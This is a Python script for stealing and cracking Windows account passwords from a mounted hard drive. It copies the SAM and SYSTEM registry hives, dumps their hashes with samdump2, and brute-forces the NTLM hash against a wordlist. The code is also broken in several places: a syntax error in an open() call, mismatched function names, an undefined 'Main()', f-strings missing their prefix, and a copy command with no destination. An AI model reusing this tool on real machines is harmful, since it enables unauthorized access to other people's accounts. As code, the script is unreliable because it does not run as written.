import hashlib, binascii, os, subprocess

guesses = 1
cracked = False

def mkdir():
    os.chdir("/mnt/")
    print("[+] Directory Changed To /mnt/")
    os.mkdir("Enter New Name For A Directory: ")
    print("[+] Created Directory")

def animal():
    def converted_ntml(password):
        ntlm_hash = binascii.hexlify(hashlib.new("md4", password.encode("utf-16le")).digest())

        return ntlm_hash

    def compare_hashes(input, test):
        if input == test:
            return True

        else:
            return False

    os.chdir("/mnt/")
    directory = input("Enter Name of Your Directory: ")
    subprocess.call("sudo fdisk -l")
    windows_harddrive = input("Enter Path To Windows Hard Drive: ") 
    subprocess.call("sudo mount -o ro " + windows_harddrive + " " + directory, shell=True)
    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SAM .", shell=True)
    subprocess.call("sudo cp /mnt/" + directory + "/Windows/System32/config/SYSTEM", shell=True)
    subprocess.call("sudo samdump2 SYSTEM SAM -o targethashes.txt", shell=True)



    with open("targethashes.txt"), "r") as input_file:
        input_hash = input_file.readline()

    with open(input("Enter Name of Password List: "), "r", errors="ignore") as password_list:
        
        for line in password_list:
            if cracked:
                break

            else:
                cracked_password = line.rstrip()
                ntlm_hash = coverted_ntlm(cracked_password)

                print("GUESSES: {guesses}", end="\r")

                if compare_hashes(input_hash, ntlm_hash):
                    cracked = True

                guesses += 1

        if cracked:
            print("PASSWORD FOUND {cracked_password}")
            subprocess.call("sudo rm -f targethashes.txt", shell=True)
            
        else:
            print("NO PASSWORD FOUND OUT OF {guesses} GUESSES")
            subprocess.call("sudo rm -f targethashes.txt", shell=True)
            subprocess.call("sudo umount windows_harddrive", shell=True) 


def main():
    try:
        print("                     MENU                     ")
        print("YOU NEED A EMPTY DIRECTORY IN /mnt/ TO CONTINUE")
        print("")
        choice = input("(Y) Make New Directory (N) Continue: ")
        if choice == "Y":
            mkdir()
            animal()
        elif choice == "N":
            animal()
        else:
            print("")
            print("INVAILD INPUT EXITING")
            quit()

    except KeyboardInterrupt:
        print("")
        print("KEYBOARD INTERRUPTION EXITING")
        quit()
Main()
